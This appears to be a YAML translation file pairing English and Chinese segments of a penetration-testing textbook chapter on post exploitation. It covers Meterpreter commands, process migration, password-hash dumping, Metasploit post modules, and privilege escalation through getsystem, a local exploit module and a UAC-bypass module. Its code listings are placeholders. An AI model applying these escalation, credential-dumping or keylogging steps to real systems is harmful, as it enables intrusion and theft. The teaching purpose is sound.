- en: Chapter 13. Post Exploitation
  id: totrans-0
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 第13章. 后期利用
- en: We’ve gained access to our target systems, so our penetration test is over,
    right? We can tell our client that we got a shell on their systems.
  id: totrans-1
  prefs: []
  type: TYPE_NORMAL
  zh: 我们已经获得了目标系统的访问权限，所以渗透测试就结束了吗？我们可以告诉客户我们已经在他们的系统上获得了一个shell。
- en: But so what? Why would the client care?
  id: totrans-2
  prefs: []
  type: TYPE_NORMAL
  zh: 那又怎么样呢？为什么客户会在乎？
- en: In the post-exploitation phase, we will look at information gathering on the
    exploited systems, privilege escalation, and moving from system to system. Perhaps
    we’ll find that we can access sensitive data stored on the exploited system or
    that we have network access to additional systems that we can use to gain further
    access to company data. Maybe the exploited system is part of a domain, and we
    can use it to access other systems on the domain. These are just a few of the
    potential avenues open to us in post exploitation.
  id: totrans-3
  prefs: []
  type: TYPE_NORMAL
  zh: 在后期利用阶段，我们将对被利用系统的信息收集、权限提升和系统之间的移动进行检查。也许我们会发现能够访问存储在被利用系统上的敏感数据，或者我们可以通过网络访问其他系统，从而进一步获取公司数据。也有可能被利用的系统是某个域的一部分，我们可以利用它访问该域中的其他系统。这些只是后期利用阶段我们可能探索的几个方向。
- en: Post exploitation is arguably the most important way to get a clear picture
    of a client’s security posture. For example, in [Chapter 9](ch09.xhtml "Chapter 9. Password
    Attacks"), I mentioned a pentest in which I used access to a decommissioned Windows
    2000 domain controller to gain complete administrative control over a domain.
    If I hadn’t used post-exploitation techniques, I might have instead concluded
    that the Windows 2000 system stored no sensitive information and that it wasn’t
    connected to other systems in a domain. My pentest would not have been nearly
    as successful, and my client wouldn’t have gotten as good of a picture of their
    vulnerabilities, especially when it came to password policies.
  id: totrans-4
  prefs: []
  type: TYPE_NORMAL
  zh: 后期利用无疑是获取客户安全态势清晰画像的最重要方式。例如，在[第9章](ch09.xhtml "第9章. 密码攻击")中，我提到了一次渗透测试，在其中我通过访问一台废弃的Windows
    2000域控制器，获得了对该域的完全管理员控制。如果我没有使用后期利用技巧，我可能会得出结论认为这台Windows 2000系统没有存储敏感信息，并且它没有连接到其他系统的域中。我的渗透测试就不会那么成功，客户也无法全面了解他们的漏洞，特别是在密码策略方面。
- en: This chapter will cover the basics of post exploitation. As you move beyond
    this book and increase your skills as a pentester, you should spend a good deal
    of time on post exploitation. Solid post-exploitation skills differentiate good
    pentesters from the truly great.
  id: totrans-5
  prefs: []
  type: TYPE_NORMAL
  zh: 本章将涵盖后期利用的基础知识。当你超越本书，提升作为渗透测试者的技能时，应该花大量时间在后期利用上。扎实的后期利用技能能够将优秀的渗透测试者与真正杰出的渗透测试者区分开来。
- en: Now let’s look at some of our post-exploitation options in Metasploit.
  id: totrans-6
  prefs: []
  type: TYPE_NORMAL
  zh: 现在让我们来看看在Metasploit中一些后期利用的选项。
- en: Meterpreter
  id: totrans-7
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: Meterpreter
- en: We discussed Meterpreter, Metasploit’s custom payload, in [Chapter 8](ch08.xhtml
    "Chapter 8. Exploitation"). Now let’s dig deeper and look at some of Meterpreter’s
    functionality.
  id: totrans-8
  prefs: []
  type: TYPE_NORMAL
  zh: 我们在[第8章](ch08.xhtml "第8章. 渗透")中讨论了Meterpreter，Metasploit的定制有效载荷。现在让我们深入探讨一些Meterpreter的功能。
- en: We’ll begin post exploitation by opening a Meterpreter session on each of our
    target systems. As you can see in [Example 13-1](ch13.xhtml#open_metasploit_sessions_on_our_targets
    "Example 13-1. Open Metasploit sessions on our targets"), I have a session on
    the Windows XP target from the MS08-067 exploit. On the Windows 7 target, I used
    a trojan executable like those we used in the previous chapter. On the Linux target,
    I used the TikiWiki PHP vulnerability we exploited in [Chapter 8](ch08.xhtml "Chapter 8. Exploitation").
    You can also log in to the Linux target via SSH using either the password for
    *georgia* we cracked in [Chapter 9](ch09.xhtml "Chapter 9. Password Attacks")
    (password) or the SSH public key we added in [Chapter 8](ch08.xhtml "Chapter 8. Exploitation")
    using the open NFS share.
  id: totrans-9
  prefs: []
  type: TYPE_NORMAL
  zh: 我们将通过在每个目标系统上打开一个Meterpreter会话来开始后期利用。如[示例13-1](ch13.xhtml#open_metasploit_sessions_on_our_targets
    "示例13-1. 在目标上打开Metasploit会话")所示，我在Windows XP目标系统上打开了一个会话，使用的是MS08-067漏洞。在Windows
    7目标系统上，我使用了像上一章中一样的木马可执行文件。在Linux目标系统上，我使用了在[第8章](ch08.xhtml "第8章. 渗透")中利用的TikiWiki
    PHP漏洞。你还可以通过SSH登录Linux目标，使用我们在[第9章](ch09.xhtml "第9章. 密码攻击")中破解的*georgia*密码（password）或我们在[第8章](ch08.xhtml
    "第8章. 渗透")中通过开放的NFS共享添加的SSH公钥。
- en: Example 13-1. Open Metasploit sessions on our targets
  id: totrans-10
  prefs: []
  type: TYPE_NORMAL
  zh: 示例13-1. 在我们的目标上打开Metasploit会话
- en: '[PRE0]'
  id: totrans-11
  prefs: []
  type: TYPE_PRE
  zh: '[PRE0]'
- en: Start by interacting with your Windows XP session as shown here.
  id: totrans-12
  prefs: []
  type: TYPE_NORMAL
  zh: 先按照这里所示与Windows XP会话进行交互。
- en: '[PRE1]'
  id: totrans-13
  prefs: []
  type: TYPE_PRE
  zh: '[PRE1]'
- en: We’ve already seen a couple of Meterpreter commands throughout the book. Namely,
    in [Chapter 9](ch09.xhtml "Chapter 9. Password Attacks"), we used `hashdump` to
    get direct access to local password hashes in on [Offline Password Attacks](ch09.xhtml#offline_password_attacks
    "Offline Password Attacks"). To see a list of available Meterpreter commands,
    enter `help` in the Meterpreter console. For more details about a specific command,
    enter `command -h`.
  id: totrans-14
  prefs: []
  type: TYPE_NORMAL
  zh: 我们在书中已经看过一些 Meterpreter 命令。比如，在 [第9章](ch09.xhtml "第9章. 密码攻击")中，我们使用 `hashdump`
    来直接访问本地密码哈希，在 [离线密码攻击](ch09.xhtml#offline_password_attacks "离线密码攻击")中也有所涉及。要查看可用的
    Meterpreter 命令，请在 Meterpreter 控制台中输入 `help`。有关特定命令的更多详细信息，可以输入 `command -h`。
- en: Using the upload Command
  id: totrans-15
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 使用上传命令
- en: Perhaps nothing is quite so annoying on a pentest as finding yourself on a Windows
    machine without access to utilities such as `wget` and `curl` to pull down files
    from a web server. In [Chapter 8](ch08.xhtml "Chapter 8. Exploitation"), we saw
    a way to bypass this problem with TFTP, but Meterpreter easily solves the problem
    for us. With a simple command, `help upload`, we can upload files to the target,
    as shown in [Example 13-2](ch13.xhtml#meterpreter_help_command "Example 13-2. Meterpreter
    help command").
  id: totrans-16
  prefs: []
  type: TYPE_NORMAL
  zh: 在渗透测试中，可能没有什么比在一台 Windows 机器上没有 `wget` 和 `curl` 等工具来从 Web 服务器下载文件更让人烦恼了。在 [第8章](ch08.xhtml
    "第8章. 利用")中，我们看到了如何使用 TFTP 绕过这个问题，但 Meterpreter 很容易帮我们解决这个问题。通过一个简单的命令 `help upload`，我们可以将文件上传到目标，如
    [示例 13-2](ch13.xhtml#meterpreter_help_command "示例 13-2. Meterpreter 帮助命令") 中所示。
- en: Example 13-2. Meterpreter help command
  id: totrans-17
  prefs: []
  type: TYPE_NORMAL
  zh: 示例 13-2. Meterpreter 帮助命令
- en: '[PRE2]'
  id: totrans-18
  prefs: []
  type: TYPE_PRE
  zh: '[PRE2]'
- en: This help information tells us that we can use `upload` to copy files from our
    Kali system to the Windows XP target.
  id: totrans-19
  prefs: []
  type: TYPE_NORMAL
  zh: 该帮助信息告诉我们，可以使用 `upload` 将文件从我们的 Kali 系统复制到 Windows XP 目标。
- en: 'For example, here’s how to upload Netcat for Windows:'
  id: totrans-20
  prefs: []
  type: TYPE_NORMAL
  zh: 例如，下面是如何上传 Netcat for Windows：
- en: '[PRE3]'
  id: totrans-21
  prefs: []
  type: TYPE_PRE
  zh: '[PRE3]'
- en: Note
  id: totrans-22
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 注意
- en: Remember to escape the backslash characters in the path with a second backslash.
    Also remember that if you upload anything to a target during a pentest or otherwise
    change the target system, record your changes so you can undo them before the
    engagement is over. The last thing you want to do is leave an environment more
    vulnerable than when you found it.
  id: totrans-23
  prefs: []
  type: TYPE_NORMAL
  zh: 请记住，在路径中的反斜杠字符需要使用第二个反斜杠进行转义。同时记得，如果在渗透测试中上传任何文件或以其他方式更改目标系统，记录下你的更改，以便在测试结束前可以撤销它们。你最不想做的事情就是让环境比你找到时更脆弱。
- en: getuid
  id: totrans-24
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: getuid
- en: Another useful Meterpreter command is `getuid`. This command will tell you the
    name of the *System* user running Meterpreter. Typically, Meterpreter runs with
    the privileges of the exploited process or user.
  id: totrans-25
  prefs: []
  type: TYPE_NORMAL
  zh: 另一个有用的 Meterpreter 命令是 `getuid`。此命令会告诉你运行 Meterpreter 的 *System* 用户的名称。通常，Meterpreter
    以被利用进程或用户的权限运行。
- en: For example, when we exploit an SMB server with the MS08-067 exploit, we’re
    running on the target with the privileges of the SMB server, namely the Windows
    *System* account, as shown here.
  id: totrans-26
  prefs: []
  type: TYPE_NORMAL
  zh: 例如，当我们利用 MS08-067 漏洞攻击 SMB 服务器时，我们是以 SMB 服务器的权限运行目标，具体来说，是以 Windows *System*
    账户的权限运行，如下所示。
- en: '[PRE4]'
  id: totrans-27
  prefs: []
  type: TYPE_PRE
  zh: '[PRE4]'
- en: On the Windows 7 target, we social-engineered the user into running a trojaned
    program that connected back to Metasploit, so Meterpreter is running as the user
    *Georgia Weidman*.
  id: totrans-28
  prefs: []
  type: TYPE_NORMAL
  zh: 在 Windows 7 目标机器上，我们通过社会工程学手段诱使用户运行一个已经植入木马的程序，该程序会连接回 Metasploit，因此 Meterpreter
    作为用户 *Georgia Weidman* 运行。
- en: Other Meterpreter Commands
  id: totrans-29
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 其他 Meterpreter 命令
- en: Before moving on, take some time to work with additional Meterpreter commands.
    You’ll find many useful commands for local information gathering, remote control,
    and even spying on local users, such as keylogging and turning on a webcam from
    a Meterpreter session.
  id: totrans-30
  prefs: []
  type: TYPE_NORMAL
  zh: 在继续之前，花点时间操作其他的 Meterpreter 命令。你会发现许多有用的命令，可以用于本地信息收集、远程控制，甚至间谍活动，如键盘记录和从 Meterpreter
    会话中打开摄像头。
- en: Meterpreter Scripts
  id: totrans-31
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: Meterpreter 脚本
- en: In addition to Meterpreter commands, you can also run Meterpreter scripts from
    a Meterpreter console. The scripts currently available can be found in Kali at
    */usr/share/metasploit-framework/scripts/meterpreter*. These scripts are written
    in Ruby, and you can write your own and submit them for inclusion in the framework.
    To use a Meterpreter script, enter `run` *`<script name>`*. Use the `-h` flag
    to see help information for a script.
  id: totrans-32
  prefs: []
  type: TYPE_NORMAL
  zh: 除了 Meterpreter 命令外，你还可以从 Meterpreter 控制台运行 Meterpreter 脚本。当前可用的脚本可以在 Kali 中的
    */usr/share/metasploit-framework/scripts/meterpreter* 找到。这些脚本是用 Ruby 编写的，你可以编写自己的脚本并提交以便纳入框架中。要使用
    Meterpreter 脚本，输入 `run` *`<script name>`*。使用 `-h` 标志可以查看脚本的帮助信息。
- en: When exploiting Internet Explorer in [Chapter 10](ch10.xhtml "Chapter 10. Client-Side
    Exploitation"), we used the `AutoRunScript` option to automatically run the *migrate*
    script to spawn a new process and migrate into it before the browser crashed.
    We can run this script directly inside Meterpreter as well. For example, entering
    **`run migrate -h`**, as shown in [Example 13-3](ch13.xhtml#migrate_script_help_information
    "Example 13-3. Migrate script help information"), gives us information on the
    *migrate* Meterpreter script.
  id: totrans-33
  prefs: []
  type: TYPE_NORMAL
  zh: 在 [第 10 章](ch10.xhtml "第 10 章. 客户端漏洞利用") 中利用 Internet Explorer 时，我们使用了 `AutoRunScript`
    选项来自动运行 *migrate* 脚本，以便在浏览器崩溃之前生成一个新进程并迁移到其中。我们也可以直接在 Meterpreter 中运行这个脚本。例如，输入
    **`run migrate -h`**，如 [示例 13-3](ch13.xhtml#migrate_script_help_information "示例
    13-3. 迁移脚本帮助信息") 所示，会显示 *migrate* Meterpreter 脚本的帮助信息。
- en: Example 13-3. Migrate script help information
  id: totrans-34
  prefs: []
  type: TYPE_NORMAL
  zh: 示例 13-3. 迁移脚本帮助信息
- en: '[PRE5]'
  id: totrans-35
  prefs: []
  type: TYPE_PRE
  zh: '[PRE5]'
- en: Because we’re not racing to beat a session before it closes, we have a few different
    options for which process to migrate to. We can migrate to a process by name using
    the `-n` option. For example, to migrate to the first instance of *explorer.exe*
    that Meterpreter encounters in the process list, we can use `-n explorer.exe`.
  id: totrans-36
  prefs: []
  type: TYPE_NORMAL
  zh: 由于我们并不是为了在会话关闭之前抢先操作，我们有一些不同的选项可以选择迁移到哪个进程。我们可以通过使用 `-n` 选项根据进程名称进行迁移。例如，要迁移到
    Meterpreter 在进程列表中遇到的第一个 *explorer.exe* 实例，可以使用 `-n explorer.exe`。
- en: You can also migrate to a process by using its process ID (PID) with the `-p`
    option. Use Meterpreter’s `ps` command to see a list of running processes, as
    shown in [Example 13-4](ch13.xhtml#running_process_list "Example 13-4. Running
    process list").
  id: totrans-37
  prefs: []
  type: TYPE_NORMAL
  zh: 你还可以通过使用进程 ID（PID）和 `-p` 选项迁移到某个进程。使用 Meterpreter 的 `ps` 命令查看正在运行的进程列表，如 [示例
    13-4](ch13.xhtml#running_process_list "示例 13-4. 运行进程列表") 所示。
- en: Example 13-4. Running process list
  id: totrans-38
  prefs: []
  type: TYPE_NORMAL
  zh: 示例 13-4. 运行进程列表
- en: '[PRE6]'
  id: totrans-39
  prefs: []
  type: TYPE_PRE
  zh: '[PRE6]'
- en: '*Explorer.exe* is a solid choice. Choose PID `1144` for *explorer.exe*, and
    run the Meterpreter *migrate* script as shown in [Example 13-5](ch13.xhtml#running_the_migrate_script
    "Example 13-5. Running the migrate script").'
  id: totrans-40
  prefs: []
  type: TYPE_NORMAL
  zh: '*Explorer.exe* 是一个可靠的选择。选择 PID `1144` 作为 *explorer.exe*，然后运行如 [示例 13-5](ch13.xhtml#running_the_migrate_script
    "示例 13-5. 运行迁移脚本") 所示的 Meterpreter *migrate* 脚本。'
- en: Example 13-5. Running the migrate script
  id: totrans-41
  prefs: []
  type: TYPE_NORMAL
  zh: 示例 13-5. 运行迁移脚本
- en: '[PRE7]'
  id: totrans-42
  prefs: []
  type: TYPE_PRE
  zh: '[PRE7]'
- en: Meterpreter successfully migrates into the *explorer.exe* process. Now if the
    SMB server happens to become unstable or die, our Meterpreter session is safe.
  id: totrans-43
  prefs: []
  type: TYPE_NORMAL
  zh: Meterpreter 成功迁移到 *explorer.exe* 进程中。现在，如果 SMB 服务器恰好变得不稳定或崩溃，我们的 Meterpreter
    会话是安全的。
- en: If you ran the `getuid` command again, you would see that we are no longer running
    as the *System* user but as user *georgia*. This makes sense because this process
    belongs to the logged-in user *georgia*. By moving into this process, we’ve effectively
    dropped our privileges down to user *georgia*.
  id: totrans-44
  prefs: []
  type: TYPE_NORMAL
  zh: 如果你再次运行 `getuid` 命令，你会看到我们不再以 *System* 用户身份运行，而是以用户 *georgia* 身份运行。这是有道理的，因为该进程属于已登录用户
    *georgia*。通过进入这个进程，我们有效地将权限降到了用户 *georgia* 的级别。
- en: Let’s stay logged in as user *georgia* on the XP target and look at some ways
    to elevate our privileges to *System* on Windows targets and *root* on the Linux
    target through local privilege-escalation attacks.
  id: totrans-45
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们继续以用户 *georgia* 登录到 XP 目标，并看看如何通过本地权限提升攻击将权限提升到 Windows 目标的 *System* 或 Linux
    目标的 *root*。
- en: Metasploit Post-Exploitation Modules
  id: totrans-46
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: Metasploit 后期利用模块
- en: So far we’ve used Metasploit modules for information gathering, vulnerability
    identification, and exploitation. It should come as no surprise that the framework
    has a plethora of useful modules for the post-exploitation phase as well. Metasploit’s
    *post* directory contains modules for local information gathering, remote control,
    privilege escalation, and so on, which span multiple platforms.
  id: totrans-47
  prefs: []
  type: TYPE_NORMAL
  zh: 到目前为止，我们已经使用了 Metasploit 模块进行信息收集、漏洞识别和利用。毫不奇怪，Metasploit 框架也有许多有用的模块用于后期利用阶段。Metasploit
    的 *post* 目录包含用于本地信息收集、远程控制、权限提升等模块，覆盖多个平台。
- en: For example, consider the module *post/windows/gather/enum_logged_on_users*.
    As shown in [Example 13-6](ch13.xhtml#running_a_metasploit_post_module "Example 13-6. Running
    a Metasploit post module"), this module will show us which users are currently
    logged on to the target system. Put your session in the background (with ctrl-Z
    or `background`) to return to the main Msfconsole prompt.
  id: totrans-48
  prefs: []
  type: TYPE_NORMAL
  zh: 例如，考虑模块 *post/windows/gather/enum_logged_on_users*。如 [示例 13-6](ch13.xhtml#running_a_metasploit_post_module
    "示例 13-6. 运行 Metasploit 后期模块") 所示，该模块将显示当前登录到目标系统的用户。将会话置于后台（使用 ctrl-Z 或 `background`）以返回主
    Msfconsole 提示符。
- en: Example 13-6. Running a Metasploit post module
  id: totrans-49
  prefs: []
  type: TYPE_NORMAL
  zh: 示例 13-6. 运行 Metasploit 后期模块
- en: '[PRE8]'
  id: totrans-50
  prefs: []
  type: TYPE_PRE
  zh: '[PRE8]'
- en: 'We use post modules as we do all Metasploit modules: We set the relevant options,
    and then enter **`exploit`** to run the module. However, in the case of post-exploitation
    modules, instead of setting an `RHOST` or `SRVHOST`, we need to tell Metasploit
    the Session ID we want to run the post-exploitation module against ❶. We then
    run the module against Session 1, the Windows XP target.'
  id: totrans-51
  prefs: []
  type: TYPE_NORMAL
  zh: 我们像使用所有 Metasploit 模块一样使用后期模块：我们设置相关选项，然后输入 **`exploit`** 来运行模块。然而，对于后期利用模块，除了设置
    `RHOST` 或 `SRVHOST`，我们还需要告诉 Metasploit 我们要运行后期利用模块的会话 ID ❶。然后我们将模块应用于会话 1，即 Windows
    XP 目标。
- en: The module returns data telling us the user *georgia* is currently logged in.
    Metasploit automatically saves the output to a file */root/.msf4/loot/20140324121217_default_192.168.20.10_host.users.activ_791806.txt*
    ❷.
  id: totrans-52
  prefs: []
  type: TYPE_NORMAL
  zh: 模块返回数据，告诉我们用户 *georgia* 当前已登录。Metasploit 会自动将输出保存到文件 */root/.msf4/loot/20140324121217_default_192.168.20.10_host.users.activ_791806.txt*
    ❷。
- en: Railgun
  id: totrans-53
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: Railgun
- en: Railgun is an extension for Meterpreter that allows direct access to Windows
    APIs. It can be used inside post-exploitation modules for Meterpreter as well
    as the Ruby shell (`irb`) in a Meterpreter session. For example, we can check
    if the session is running as an administrative user by directly accessing the
    `IsUserAnAdmin` function of the *shell32* Windows DLL, as shown here. Be sure
    to bring a session to the foreground with `sessions -i` *`<session id>`* first.
  id: totrans-54
  prefs: []
  type: TYPE_NORMAL
  zh: Railgun 是一个 Meterpreter 的扩展，允许直接访问 Windows API。它可以在 Meterpreter 的后期利用模块中使用，也可以在
    Meterpreter 会话中的 Ruby shell（`irb`）中使用。例如，我们可以通过直接访问 *shell32* Windows DLL 的 `IsUserAnAdmin`
    函数来检查会话是否以管理员身份运行，如图所示。务必先使用 `sessions -i` *`<session id>`* 将会话带到前台。
- en: '[PRE9]'
  id: totrans-55
  prefs: []
  type: TYPE_PRE
  zh: '[PRE9]'
- en: First, we drop into a Ruby shell with the command `irb`. Note that the `client`
    variable holds the Meterpreter client. Next we enter **`client.railgun.shell32.IsUserAnAdmin`**
    to tell the Ruby interpreter to use Railgun on the current Meterpreter session
    and access the `IsUserAdmin` function of *shell32.dll*. (For additional Railgun
    examples, check out Metasploit post modules such as *windows/gather/reverse_lookup.rb*
    and *windows/manage/download_exec.rb*, which also leverage this functionality.)
    Enter **`exit`** to drop out of the Ruby interpreter and return to Meterpreter.
  id: totrans-56
  prefs: []
  type: TYPE_NORMAL
  zh: 首先，我们使用命令 `irb` 进入 Ruby shell。请注意，`client` 变量保存了 Meterpreter 客户端。接下来，我们输入 **`client.railgun.shell32.IsUserAnAdmin`**，告诉
    Ruby 解释器在当前 Meterpreter 会话中使用 Railgun 并访问 *shell32.dll* 的 `IsUserAdmin` 函数。（有关更多
    Railgun 示例，请查看 Metasploit 后期模块，如 *windows/gather/reverse_lookup.rb* 和 *windows/manage/download_exec.rb*，这些也利用了该功能。）输入
    **`exit`** 退出 Ruby 解释器并返回 Meterpreter。
- en: Local Privilege Escalation
  id: totrans-57
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 本地权限提升
- en: In the following sections, we’ll explore examples of *local privilege escalation*,
    which involves running exploits to gain additional control of the system after
    exploitation.
  id: totrans-58
  prefs: []
  type: TYPE_NORMAL
  zh: 在接下来的部分中，我们将探讨 *本地权限提升* 的示例，该过程涉及在利用后运行漏洞利用来获得更多的系统控制权限。
- en: Just like network software and client-side software, privileged local processes
    can be subject to exploitable security issues. Some of your attacks may not result
    in gaining the privileges you would like. Gaining command execution through a
    website, compromising a user account without administrative rights, or exploiting
    a listening service with limited privileges can all lead to system access, but
    you may find yourself still working as a limited user. To get the privileges we
    want, we will need to exploit further issues.
  id: totrans-59
  prefs: []
  type: TYPE_NORMAL
  zh: 就像网络软件和客户端软件一样，特权本地进程也可能存在可被利用的安全问题。你的某些攻击可能无法获得你期望的特权。通过网站获得命令执行、在没有管理员权限的情况下妥协用户账户，或利用有限权限的监听服务都可能导致系统访问，但你可能仍然只能作为一个受限用户工作。为了获得我们想要的特权，我们需要进一步利用其他漏洞。
- en: getsystem on Windows
  id: totrans-60
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 在 Windows 上运行 `getsystem`
- en: Meterpreter’s `getsystem` command automates trying a series of known local privilege-escalation
    exploits against the target. The command’s options are shown in [Example 13-7](ch13.xhtml#getsystem_help
    "Example 13-7. getsystem help").
  id: totrans-61
  prefs: []
  type: TYPE_NORMAL
  zh: Meterpreter 的 `getsystem` 命令会自动尝试一系列已知的本地权限提升漏洞利用。该命令的选项如 [示例 13-7](ch13.xhtml#getsystem_help
    "示例 13-7. getsystem 帮助") 所示。
- en: Example 13-7. `getsystem` help
  id: totrans-62
  prefs: []
  type: TYPE_NORMAL
  zh: 示例 13-7. `getsystem` 帮助
- en: '[PRE10]'
  id: totrans-63
  prefs: []
  type: TYPE_PRE
  zh: '[PRE10]'
- en: As shown here, running `getsystem` with no arguments will run a series of local
    exploits until one succeeds or all known exploits are exhausted. To run a particular
    exploit, use the `-t` option followed by the exploit number.
  id: totrans-64
  prefs: []
  type: TYPE_NORMAL
  zh: 如图所示，运行没有参数的 `getsystem` 将运行一系列本地漏洞利用，直到某个成功或所有已知漏洞利用被耗尽。要运行特定的漏洞利用，请使用 `-t`
    选项，后跟漏洞利用编号。
- en: Here we run `getsystem` on our Windows XP target with no arguments.
  id: totrans-65
  prefs: []
  type: TYPE_NORMAL
  zh: 在这里，我们在 Windows XP 目标上运行没有参数的 `getsystem`。
- en: '[PRE11]'
  id: totrans-66
  prefs: []
  type: TYPE_PRE
  zh: '[PRE11]'
- en: As you can see, Meterpreter gained system privileges with the first exploit
    it tried. With one command, we are able to elevate our privileges from *georgia*
    to *System*.
  id: totrans-67
  prefs: []
  type: TYPE_NORMAL
  zh: 如你所见，Meterpreter通过第一次尝试的漏洞成功获得了系统权限。通过一个命令，我们就能够将权限从*georgia*提升到*System*。
- en: Local Escalation Module for Windows
  id: totrans-68
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: Windows本地升级模块
- en: Local exploit modules in Metasploit allow you to run an exploit on an open session
    to gain additional access. The local privilege-escalation module *exploit/windows/local/ms11_080_afdjoinleaf*
    in [Example 13-8](ch13.xhtml#metasploit_local_exploit "Example 13-8. Metasploit
    local exploit") exploits a (now-patched) flaw in the `Afdjoinleaf` function of
    the *afd.sys* Windows driver. Like post-exploitation modules, use the `SESSION`
    option to denote which open session the exploit should be run against. We’ll run
    the module against our Windows XP session. Unlike post modules, local exploits
    are exploits, so we’ll need to set a payload. If it succeeds, our exploit will
    open a new session with System privileges. In your Windows XP Meterpreter session,
    run the command **`rev2self`** to drop back down to the user *georgia* before
    using this alternative privilege-escalation technique.
  id: totrans-69
  prefs: []
  type: TYPE_NORMAL
  zh: Metasploit中的本地漏洞利用模块允许你在一个打开的会话中运行漏洞利用程序，以获得额外的访问权限。示例13-8中的本地特权升级模块*exploit/windows/local/ms11_080_afdjoinleaf*利用了`Afdjoinleaf`函数中的一个（现已修复的）漏洞，该函数属于*afd.sys*
    Windows驱动程序。与后期利用模块类似，使用`SESSION`选项来指定应该在哪个打开的会话中运行漏洞利用程序。我们将在Windows XP会话中运行该模块。与后期利用模块不同，本地漏洞利用程序是漏洞利用程序，因此我们需要设置一个有效载荷。如果成功，我们的漏洞利用程序将打开一个具有系统权限的新会话。在你的Windows
    XP Meterpreter会话中，运行命令**`rev2self`**将权限降回到用户*georgia*，然后再使用这种替代的特权升级技术。
- en: Example 13-8. Metasploit local exploit
  id: totrans-70
  prefs: []
  type: TYPE_NORMAL
  zh: 示例 13-8. Metasploit本地漏洞利用
- en: '[PRE12]'
  id: totrans-71
  prefs: []
  type: TYPE_PRE
  zh: '[PRE12]'
- en: After you enter **`exploit`**, Metasploit runs the exploit in our Windows XP
    session. If it succeeds, you should receive another Meterpreter session. If you
    run `getuid` on this new session, you should see that you’ve once again obtained
    System privileges.
  id: totrans-72
  prefs: []
  type: TYPE_NORMAL
  zh: 在输入**`exploit`**后，Metasploit将在我们的Windows XP会话中运行该漏洞利用程序。如果攻击成功，你应该会收到另一个Meterpreter会话。如果在这个新会话中运行`getuid`，你应该会看到你再次获得了系统权限。
- en: Note
  id: totrans-73
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 注意
- en: Remember, to succeed, local privilege-escalation attacks rely on a flaw such
    as a missing patch or security misconfiguration. A fully updated and locked-down
    system would not be vulnerable to the MS11-08 exploit because a vendor patch was
    released in 2011.
  id: totrans-74
  prefs: []
  type: TYPE_NORMAL
  zh: 请记住，要成功进行本地特权升级攻击，必须依赖于某个漏洞，如缺失的补丁或安全配置错误。一个完全更新且已加固的系统不会受到MS11-08漏洞的影响，因为供应商在2011年发布了补丁。
- en: Bypassing UAC on Windows
  id: totrans-75
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 绕过Windows上的UAC
- en: Now let’s see how to escalate our privileges on our more secure Windows 7 target,
    which has additional security features including *user account control (UAC)*.
    Applications running on Windows Vista and higher are limited to using regular
    user privileges. If an application needs to use administrative privileges, an
    administrative user has to approve the elevation. (You’ve probably seen the warning
    notice from UAC when an application wants to make changes.)
  id: totrans-76
  prefs: []
  type: TYPE_NORMAL
  zh: 现在让我们看看如何在更加安全的Windows 7目标上升级权限，Windows 7有额外的安全特性，包括*用户账户控制（UAC）*。运行在Windows
    Vista及更高版本上的应用程序仅能使用普通用户权限。如果应用程序需要使用管理员权限，必须由管理员用户批准提升权限。（你可能已经见过当应用程序想要进行更改时，UAC会发出警告通知。）
- en: Because we gained this session by having user *Georgia Weidman* run a malicious
    binary, the Meterpreter session currently has the privileges of Georgia Weidman.
    Try using `getsystem` against this target, as shown in [Example 13-9](ch13.xhtml#getsystem_fails_on_windows_7
    "Example 13-9. getsystem fails on Windows 7").
  id: totrans-77
  prefs: []
  type: TYPE_NORMAL
  zh: 因为我们通过让用户*Georgia Weidman*运行恶意二进制文件获得了这个会话，所以Meterpreter会话当前具有Georgia Weidman的权限。尝试在这个目标上使用`getsystem`，如[示例13-9](ch13.xhtml#getsystem_fails_on_windows_7
    "示例13-9. `getsystem`在Windows 7上失败")所示。
- en: Example 13-9. `getsystem` fails on Windows 7
  id: totrans-78
  prefs: []
  type: TYPE_NORMAL
  zh: 示例 13-9. `getsystem`在Windows 7上失败
- en: '[PRE13]'
  id: totrans-79
  prefs: []
  type: TYPE_PRE
  zh: '[PRE13]'
- en: As you can see, running `getsystem` against this target fails and gives an error
    message. Perhaps this system is fully patched and hardened to the point where
    none of the exploitation techniques in `getsystem` will work.
  id: totrans-80
  prefs: []
  type: TYPE_NORMAL
  zh: 如你所见，针对该目标运行`getsystem`失败并给出了错误信息。也许该系统已经完全打了补丁并经过加固，以至于`getsystem`中的任何利用技术都无法奏效。
- en: But as it turns out, our Windows 7 target has not been patched since installation;
    UAC is stopping `getsystem` from working properly.
  id: totrans-81
  prefs: []
  type: TYPE_NORMAL
  zh: 但事实证明，我们的Windows 7目标自安装以来没有进行任何补丁更新；UAC正在阻止`getsystem`正常工作。
- en: As with any computer security control, researchers have developed multiple techniques
    to bypass the UAC control. One such technique is included in Metasploit in the
    local exploit *windows/local/bypassuac*. Background the session and run this exploit
    on your Windows 7 session, as shown in [Example 13-10](ch13.xhtml#using_a_module_to_bypass_the_uac_control
    "Example 13-10. Using a module to bypass the UAC control"). Use the exploit module,
    set the `SESSION` option, and so on.
  id: totrans-82
  prefs: []
  type: TYPE_NORMAL
  zh: 和任何计算机安全控制一样，研究人员已经开发了多种技术来绕过UAC控制。其中一种技术包含在Metasploit中的本地利用模块*windows/local/bypassuac*。背景化会话并在你的Windows
    7会话上运行这个利用，如[示例 13-10](ch13.xhtml#using_a_module_to_bypass_the_uac_control "示例 13-10.
    使用模块绕过UAC控制")所示。使用这个利用模块，设置`SESSION`选项，等等。
- en: Example 13-10. Using a module to bypass the UAC control
  id: totrans-83
  prefs: []
  type: TYPE_NORMAL
  zh: 示例 13-10. 使用模块绕过UAC控制
- en: '[PRE14]'
  id: totrans-84
  prefs: []
  type: TYPE_PRE
